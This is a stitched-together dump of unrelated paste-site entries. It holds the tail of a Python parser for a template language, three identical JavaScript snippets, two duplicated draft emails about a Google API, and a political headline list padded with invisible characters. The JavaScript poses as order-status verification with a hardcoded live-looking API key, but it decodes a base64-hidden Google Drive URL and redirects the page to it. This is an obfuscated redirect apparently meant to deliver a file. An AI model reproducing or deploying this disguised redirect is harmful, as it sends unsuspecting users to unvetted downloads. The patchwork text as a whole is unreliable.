    item=await parse(item, **kwargs)
    trash=''
    try:
        for i,j in dict(json.loads(item)).items():
            await let(""i"",i)
            await let(""j"",j)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
    except TypeError as e:
        if e.args[0]==""cannot convert dictionary update sequence element #0 to a sequence"":
            for i in list(json.loads(item)):
                await let(""i"",i)
                try:
                    trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
                except StopWord:
                    break
            return trash
    except: pass
    if len(item.split(""..""))>1:
        a=item.split("".."")
        for i in range(int(a[0]),int(a[1])+1):
            await let(""i"",i)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
    else:
        for i in range(int(item)):
            await let(""i"",i)
            try:
                trash=trash+str(await parse(code,stop_word=True,in_cycle=True, **kwargs))
            except StopWord:
                break
        return trash
                
@addfunc(funcs, ""len"")
async def xflen(item,*args, **kwargs):
    ""Allows to get string lenght.""
    try:
        return len(dict(json.loads(item)).items())
    except TypeError as e:
        if e.args[0]==""cannot convert dictionary update sequence element #0 to a sequence"":
            return len(list(json.loads(item)))
        else: return len(item)

@addfunc(funcs, ""reverse"")
async def xfreverse(item:str,*args, **kwargs):
    ""Allows to get reversed string.""
    try:
        return list(json.loads(item))[::-1]
    except TypeError as e:
        return item[::-1]

@addfunc(funcs, ""round"")
async def xfround(item:float,col:int=0,*args, **kwargs):
    ""Allows to get round number.""
    if col == 0:
        return int(round(item,col))
    else:
        return round(item,col)

@addfunc(funcs, ""lower"")
async def xflower(item:str,*args, **kwargs):
    ""Allows to get lowercase string.""
    return item.lower()

@addfunc(funcs, ""exit"")
async def pyexit(*args, **kwargs):
    ""Just... 'exit' from python...""
    exit()

@addfunc(funcs, ""upper"")
async def xfupper(item:str,*args, **kwargs):
    ""Allows to get uppercase string.""
    return item.upper()

@addfunc(funcs, ""randomtextlist"")
async def xfrandomtext(item:list,col:int=1,*args, **kwargs):
    ""Allows to get random text from list.""
    return random.choices(item,k=col)

@addfunc(funcs, ""randomtext"")
async def xfrandomtext(col:int=1, *args, **kwargs):
    ""Allows to get random text from args.""
    return random.choices(args[:-1],k=col)

@addfunc(funcs, ""time"")
async def xftimestamp(*args, **kwargs):
    ""Allows to get timestamp.""
    return time.time()

@addfunc(funcs, ""fetch"")
async def xffetch(item:str,name:str=None,*args, **kwargs):
    ""Fetching data and store in storage.""
    if name == None:
        await let(""_"",json.loads(item))
        return ""$get[_]""
    else: 
        await let(name,json.loads(item))
        return f""$get[{name}]""

@addfunc(funcs, ""def"")
async def deffunc(code:str, name:str=None,*args, **kwargs):
    ""Allows to create anonymous (or not) function.""
    if name == None:
        name=str(uuid.uuid4())[:6]
        await let(name,code)
        return f""<Function {name}>""
    else:
        @addfunc(anonfuncs, name)
        async def anonf(*args,**kwargs):
            return await parse(code)
        return ''
#parser
async def parse_argument(arg):
    return re.sub(r""(?<!\\)\;"", '%#*()', arg).replace(""\\"",'').split('%#*()')
async def parse_argument_DNT(arg:str):
    code=arg
    while True:
            enn=re.search(r'\$(\w+)\[',code.lower())
            if enn==None:
                break
            en_s=enn.start()
            if int(en_s)>len(code):
                break
            en_e=enn.end()
            en=enn.end()
            ens=1
            function=code[en_s:en_e][1:-1].lower()
            if hasattr(funcs,function) or hasattr(anonfuncs,function):
                try:
                    while ens>0:
                        if code[en]==""["":
                            ens+=1
                        elif code[en]==']':
                            ens-=1
                        elif en>len(code):
                            raise AttributeError(""error"")
                        en+=1
                except IndexError:
                    raise IndexError(f""Out of range in '{function}'"")
            code=code.replace(code[en_s:en],'&i'+code[en_s:en][1:].replace("";"",'\\;'),1)
    return re.sub(r""(?<!\\)\;"", '%#*()', code).replace(""\\"",'').replace(""&i"",'$').split('%#*()')
async def __parse_code(code: str, stop_word:bool=False, in_cycle:bool=False, **kwargs):
    try:
        while True:
            enn=re.search(r'\$(\w+)\[',code.lower())
            en_s=enn.start()
            if int(en_s)>len(code):
                raise AttributeError(""ERROR"")
            en_e=enn.end()
            en=enn.end()
            ens=1
            function=code[en_s:en_e][1:-1].lower()
            if hasattr(funcs,function) or hasattr(anonfuncs,function):
                try:
                    while ens>0:
                        if code[en]==""["":
                            ens+=1
                        elif code[en]==']':
                            ens-=1
                        elif en>len(code):
                            raise AttributeError(""error"")
                        en+=1
                except IndexError:
                    raise IndexError(f""Out of range in '{function}'"")
                argument=code[en_e:en][:-1]
                if function in DNTl:
                    argument=await parse_argument_DNT(argument)
                elif argument=='': argument=['']
                else:
                    argument=await parse_argument(await __parse_code(argument,in_cycle=in_cycle, **kwargs))
                if hasattr(funcs,function):
                    fun=getattr(funcs, function)
                elif hasattr(anonfuncs,function):
                    fun=getattr(anonfuncs, function)
                insp=inspect.getfullargspec(fun).args
                insp_l=len(insp)
                for i in insp:
                    if not inspect.signature(fun).parameters[i].default is inspect._empty:
                        insp_l-=1
                if len(argument) >= insp_l:
                    sgin=inspect.signature(fun)
                    for i,k in zip(insp,argument):
                        isdnsd=sgin.parameters[i].annotation
                        if isindclass(isdnsd, str) or isindclass(isdnsd, inspect._empty):
                            if k == '':
                                raise Empty(f""Mising var {i} in {fun.__name__}"")
                        elif isindclass(isdnsd, AnonFunction):
                            x=re.search(r""<Function (\w+)>"", k)
                            if x:
                                argument[argument.index(k)]=AnonFunction(x.groups()[0],await get(x.groups()[0]))
                            else:
                                raise Empty(f""Mising var {i} in {fun.__name__}"")
                        elif isindclass(isdnsd, int):   
                            if k.isdigit():
                                argument[argument.index(k)]=int(k)
                            else:
                                if k.count('.') == 1:
                                    s = k.replace('.', '')
                                    if s.isdigit():
                                        argument[argument.index(k)]=int(k)
                                    else:
                                        raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                                else:
                                    raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, float):
                            try:
                                argument[argument.index(k)]=float(k)
                            except: raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, list) or isindclass(isdnsd, dict):
                            try: argument[argument.index(k)]=json.loads(k)
                            except: raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        elif isindclass(isdnsd, bool):
                            if k.lower()==""true"":
                                argument[argument.index(k)]=True
                            elif k.lower()==""false"":
                                argument[argument.index(k)]=False
                            else:
                                raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                        else:
                            raise WrongAnnotation(f""Wrong varible {i} type in {fun.__name__}. Need {isdnsd}"")
                    output=''
                    try:
                        output=await fun(*argument,**kwargs)
                    except StopWord:
                        if stop_word==True or in_cycle == True:
                            raise StopWord(""0_0"")
                    code=code.replace(code[en_s:en], str(output),1)
                else:
                    raise Empty(f""Mising var {insp[len(argument)]} in {fun.__name__}"")
            else:
                code=re.sub(r""\$(\w+)\["", ""&i""+code[en_s+1:en].replace("";"",'&k'),code,count=1)
    except AttributeError as e:
        pass
    except OnlyIf as e:
        return e.args[0]
    except Raise as e:
        raise Raise(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
    return code.strip()
async def parse(code: str,del_empty_lines:bool=False,clear_output:bool=True,stop_word:bool=False,in_cycle:bool=False,**kwargs):
    ""Parser for xfox code!""
    output=await __parse_code(re.sub('\/\/.*?\/\/', '', code, flags=re.DOTALL),stop_word=stop_word,in_cycle=in_cycle,**kwargs)
    output=output.strip()
    if clear_output:
        for i,j in output_rep.items():
            output=re.sub(i,j,output)
        output=output
    if del_empty_lines:
        output='\n'.join([line for line in output.splitlines() if line.strip() != ''])
    return output"
KzsYLRun,Untitled,FleZ,JavaScript,Monday 24th of March 2025 05:50:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/761/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8ehGDqB3,Untitled,FleZ,JavaScript,Monday 24th of March 2025 05:34:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/296/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QaftWQqA,Untitled,FleZ,JavaScript,Monday 24th of March 2025 05:19:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/780/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gMU7DQba,email_correct,Uno2K,Python,Monday 24th of March 2025 05:17:02 PM CDT,"</first_email>
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</first_email>

<second_email>
Hi Bruno,
 
Thanks for the update on Google's Client-Side API. This sounds like a great opportunity to enhance our web applications.
 
A few things come to mind:
- We should identify which current projects could benefit the most from this API.
- It might be useful to run some preliminary tests to understand the integration process and any potential challenges.
- We should also consider the security implications of handling requests on the client side.
 
I'll start looking into the documentation and see how we can get started. If anyone has specific projects in mind or needs further details, let's discuss.
 
Best regards,
Bruno Lago
</second_email>"
bDnJZw5h,email_example,Uno2K,Python,Monday 24th of March 2025 05:14:41 PM CDT,"</first_email>
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</first_email>

<second_email>
Hi Bruno,
 
Thanks for the update on Google's Client-Side API. This sounds like a great opportunity to enhance our web applications.
 
A few things come to mind:
- We should identify which current projects could benefit the most from this API.
- It might be useful to run some preliminary tests to understand the integration process and any potential challenges.
- We should also consider the security implications of handling requests on the client side.
 
I'll start looking into the documentation and see how we can get started. If anyone has specific projects in mind or needs further details, let's discuss.
 
Best regards,
Bruno Lago
On 24 Mar 2025 at 18:55 -0300, Bruno Lago <brunolago@incorppar.com>, wrote:
Hi Team,
 
I wanted to touch base regarding Google's Client-Side API. This API is a powerful tool for integrating Google's services directly into our web applications.
 
Here are the key points:
- It allows for seamless interaction with Google's services.
- Enhances user experience by providing direct access to features such as Google Maps, YouTube, and more.
- Reduces server load by handling requests on the client side.
 
We should explore how we can leverage this API in our current projects to improve functionality and performance.
 
Let me know if you have any questions or need further details.
 
Best,  
Bruno Lago
</second_email>"
JYwbDdFC,News March24 25,Newscaster_Ned,Email,Monday 24th of March 2025 05:10:58 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

G‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎ ‎g‎u‎a‎!‎

T‎r‎u‎m‎p‎,‎ ‎H‎y‎u‎n‎d‎a‎i‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎C‎o‎m‎p‎a‎n‎y‎ ‎I‎s‎ ‎I‎n‎v‎e‎s‎t‎i‎n‎g‎ ‎$‎2‎1‎ ‎B‎i‎l‎l‎i‎o‎n‎ ‎i‎n‎ ‎U‎.‎S‎.‎
T‎r‎u‎m‎p‎ ‎E‎s‎t‎i‎m‎a‎t‎e‎s‎ ‎'‎$‎4‎ ‎T‎r‎i‎l‎l‎i‎o‎n‎ ‎W‎o‎r‎t‎h‎ ‎o‎f‎ ‎C‎o‎m‎p‎a‎n‎i‎e‎s‎'‎ ‎A‎r‎e‎ ‎'‎M‎o‎v‎i‎n‎g‎ ‎B‎a‎c‎k‎'‎ ‎t‎o‎ ‎U‎.‎S‎.‎
C‎N‎N‎ ‎C‎o‎m‎i‎c‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎I‎a‎n‎ ‎B‎l‎a‎c‎k‎ ‎S‎m‎e‎a‎r‎s‎ ‎D‎e‎c‎e‎a‎s‎e‎d‎ ‎F‎o‎r‎m‎e‎r‎ ‎R‎e‎p‎.‎ ‎M‎i‎a‎ ‎L‎o‎v‎e‎ ‎a‎s‎ ‎‘‎D‎E‎I‎ ‎C‎o‎
C‎h‎i‎n‎e‎s‎e‎ ‎C‎o‎p‎p‎e‎r‎ ‎M‎i‎n‎e‎ ‎C‎a‎u‎s‎e‎s‎ ‎G‎i‎a‎n‎t‎ ‎A‎c‎i‎d‎ ‎S‎p‎i‎l‎l‎ ‎i‎n‎ ‎Z‎a‎m‎b‎i‎a‎
U‎.‎S‎.‎-‎U‎k‎r‎a‎i‎n‎e‎-‎R‎u‎s‎s‎i‎a‎ ‎T‎a‎l‎k‎s‎ ‎B‎e‎g‎i‎n‎ ‎i‎n‎ ‎S‎a‎u‎d‎i‎ ‎A‎r‎a‎b‎i‎a‎
R‎e‎p‎o‎r‎t‎:‎ ‎F‎B‎I‎ ‎o‎n‎ ‎'‎F‎r‎e‎n‎z‎i‎e‎d‎ ‎M‎i‎s‎s‎i‎o‎n‎'‎ ‎t‎o‎ ‎R‎e‎d‎a‎c‎t‎ ‎E‎p‎s‎t‎e‎i‎n‎ ‎F‎i‎l‎e‎s‎ ‎A‎h‎e‎a‎d‎ ‎o‎f‎ ‎R‎e‎l‎e‎a‎s‎e‎
J‎u‎d‎g‎e‎:‎ ‎'‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎
I‎C‎E‎ ‎D‎e‎t‎a‎i‎n‎s‎ ‎3‎7‎0‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎i‎n‎ ‎B‎o‎s‎t‎o‎n‎ ‎O‎p‎e‎r‎a‎t‎i‎o‎n‎
T‎o‎m‎ ‎H‎o‎m‎a‎n‎ ‎O‎v‎e‎r‎s‎a‎w‎ ‎I‎C‎E‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎i‎n‎ ‎B‎o‎s‎t‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎P‎r‎o‎m‎i‎s‎i‎n‎g‎ ‎t‎o‎ ‎B‎r‎i‎n‎g‎ ‎'‎H‎e‎l‎l‎'‎
J‎e‎m‎e‎l‎e‎ ‎H‎i‎l‎l‎ ‎S‎t‎i‎r‎s‎ ‎R‎a‎c‎i‎s‎t‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎t‎o‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎r‎u‎m‎p‎-‎S‎u‎p‎p‎o‎r‎t‎i‎n‎g‎ ‎C‎u‎b‎a‎n‎ ‎B‎a‎n‎d‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
S‎h‎o‎c‎k‎:‎ ‎J‎u‎d‎g‎e‎ ‎A‎l‎l‎o‎w‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎l‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎

B‎o‎a‎s‎b‎e‎r‎g‎ ‎E‎m‎e‎r‎g‎e‎s‎ ‎a‎s‎ ‎T‎o‎p‎ ‎F‎o‎e‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎ ‎A‎g‎e‎n‎d‎a‎
J‎a‎m‎e‎s‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎,‎ ‎i‎n‎c‎o‎m‎i‎n‎g‎ ‎c‎h‎i‎e‎f‎ ‎j‎u‎d‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎S‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎ ‎C‎o‎u‎r‎t‎,‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎,‎ ‎U‎S‎,‎ ‎o‎n‎ ‎M‎
T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎m‎i‎g‎r‎a‎n‎t‎s‎ ‎m‎u‎s‎t‎ ‎b‎e‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎a‎p‎p‎e‎a‎l‎ ‎t‎h‎e‎i‎r‎ ‎d‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎r‎d‎e‎r‎e‎d‎ ‎u‎n‎d‎e‎r‎ ‎t‎h‎e‎ ‎1‎7‎9‎8‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎,‎ ‎J‎u‎d‎g‎e‎ ‎J‎a‎m‎e‎s‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎r‎u‎l‎e‎d‎ ‎M‎o‎n‎d‎a‎y‎.‎

N‎o‎l‎t‎e‎:‎ ‎R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎’‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎o‎v‎i‎e‎ ‎‘‎A‎l‎t‎o‎ ‎K‎n‎i‎g‎h‎t‎s‎’‎ ‎B‎o‎m‎b‎e‎d‎ ‎P‎l‎a‎n‎e‎t‎-‎W‎i‎d‎e‎
N‎o‎l‎t‎e‎:‎ ‎R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎’‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎o‎v‎i‎e‎ ‎‘‎A‎l‎t‎o‎ ‎K‎n‎i‎g‎h‎t‎s‎’‎ ‎B‎o‎m‎b‎e‎d‎ ‎P‎l‎a‎n‎e‎t‎-‎W‎i‎d‎e‎
2‎1‎4‎
J‎u‎d‎g‎e‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎A‎l‎l‎o‎w‎s‎ ‎T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎l‎ ‎‘‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎’‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎
B‎o‎a‎s‎b‎e‎r‎g‎ ‎L‎e‎t‎s‎ ‎T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎A‎p‎p‎e‎a‎l‎ ‎'‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎'‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎
2‎,‎6‎5‎7‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎f‎t‎e‎r‎ ‎E‎x‎-‎S‎q‎u‎a‎d‎ ‎M‎e‎m‎b‎e‎r‎ ‎J‎a‎m‎a‎a‎l‎ ‎B‎o‎w‎m‎a‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎‘‎N‎a‎z‎i‎,‎’‎ ‎‘‎T‎h‎i‎e‎f‎’‎ ‎o‎
M‎u‎s‎k‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎f‎t‎e‎r‎ ‎J‎a‎m‎a‎a‎l‎ ‎B‎o‎w‎m‎a‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎‘‎N‎a‎z‎i‎,‎ ‎'‎T‎h‎i‎e‎f‎'‎ ‎o‎n‎ ‎C‎N‎N‎
6‎,‎8‎6‎6‎
J‎o‎h‎n‎s‎o‎n‎:‎ ‎6‎2‎%‎ ‎o‎f‎ ‎F‎e‎d‎e‎r‎a‎l‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎L‎a‎s‎t‎ ‎C‎e‎n‎t‎u‎r‎y‎ ‎H‎a‎n‎d‎e‎d‎ ‎D‎o‎w‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎,‎ ‎9‎2‎%‎ ‎o‎f‎ ‎T‎h‎o‎s‎e‎ ‎b‎y‎ ‎D‎e‎m‎-‎
J‎o‎h‎n‎s‎o‎n‎:‎ ‎6‎2‎%‎ ‎o‎f‎ ‎F‎e‎d‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎L‎a‎s‎t‎ ‎C‎e‎n‎t‎u‎r‎y‎ ‎H‎a‎n‎d‎e‎d‎ ‎D‎o‎w‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎
8‎8‎4‎
W‎S‎J‎:‎ ‎‘‎D‎e‎p‎r‎e‎s‎s‎e‎d‎’‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎‘‎F‎i‎n‎d‎ ‎H‎o‎p‎e‎’‎ ‎i‎n‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎,‎ ‎A‎l‎e‎x‎a‎n‎d‎r‎i‎a‎ ‎O‎c‎a‎s‎i‎o‎
W‎S‎J‎:‎ ‎D‎e‎m‎s‎ ‎'‎F‎i‎n‎d‎ ‎H‎o‎p‎e‎'‎ ‎i‎n‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎,‎ ‎A‎l‎e‎x‎a‎n‎d‎r‎i‎a‎ ‎O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎ ‎R‎a‎l‎l‎i‎e‎s‎
1‎1‎4‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎:‎ ‎‘‎I‎ ‎T‎h‎i‎n‎k‎ ‎Y‎o‎u‎ ‎P‎u‎n‎c‎h‎’‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎
4‎,‎6‎6‎1‎
B‎i‎l‎l‎ ‎M‎a‎h‎e‎r‎ ‎S‎a‎y‎s‎ ‎‘‎F‎*‎*‎k‎ ‎Y‎o‎u‎’‎ ‎t‎o‎ ‎C‎r‎i‎t‎i‎c‎s‎ ‎o‎f‎ ‎H‎i‎s‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎M‎e‎e‎t‎i‎n‎g‎
B‎i‎l‎l‎ ‎M‎a‎h‎e‎r‎ ‎S‎a‎y‎s‎ ‎'‎F‎*‎*‎*‎ ‎Y‎o‎u‎'‎ ‎t‎o‎ ‎C‎r‎i‎t‎i‎c‎s‎ ‎o‎f‎ ‎H‎i‎s‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎M‎e‎e‎t‎i‎n‎g‎
7‎8‎0‎
G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎C‎r‎i‎e‎s‎ ‎‘‎F‎o‎r‎e‎i‎g‎n‎ ‎I‎n‎t‎e‎r‎f‎e‎r‎e‎n‎c‎e‎’‎ ‎a‎n‎d‎ ‎P‎l‎a‎n‎s‎ ‎C‎o‎l‎d‎ ‎R‎e‎c‎e‎p‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎U‎s‎h‎a‎ ‎V‎a‎n‎c‎e‎ ‎a‎n‎d‎ ‎T‎r‎u‎m‎
G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎C‎r‎i‎e‎s‎ ‎'‎F‎o‎r‎e‎i‎g‎n‎ ‎I‎n‎t‎e‎r‎f‎e‎r‎e‎n‎c‎e‎,‎'‎ ‎D‎e‎n‎o‎u‎n‎c‎e‎s‎ ‎V‎i‎s‎i‎t‎s‎
7‎9‎0‎
